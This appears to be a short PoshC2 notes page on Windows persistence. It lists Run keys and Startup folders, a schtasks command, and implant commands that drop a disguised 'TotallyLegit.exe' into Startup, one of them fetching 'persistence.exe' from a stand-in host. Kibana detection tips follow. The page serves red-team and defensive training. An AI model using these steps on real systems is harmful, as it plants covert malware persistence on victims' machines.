# [Redundant access](https://attack.mitre.org/techniques/T1133/)

## Folder Locations: 
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
* C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
* C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

## Exploit syntax:
* SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00

* Reference [Job Scheduling](/Poshc2/instructions/Job_Scheduling.md) for information on redundant access within scheduled tasks

* Can upload a file directly from implant:

```powershell

1. upload-file
2. "../../../../tmp/example.txt" 
3. 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\TotallyLegit.exe'

```

* Also possible to utilize a staged website to pull the malicious file from:

```powershell

web-upload-file -from 'http://notmalicious.com/persistence.exe' -to 'C:\\Users[Username]\\AppData\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\TotallyLegit.exe'

```

## Detection Technique:
* (Kibana): Use a string search to detect schtasks operating within the network. Then add process.command_line to the results column. This will allow for quick separation of uncommon scheduled tasks.

* Investigate downloads from suspicious websites, particularly exe files

* Investigate file creation in the default startup file locations
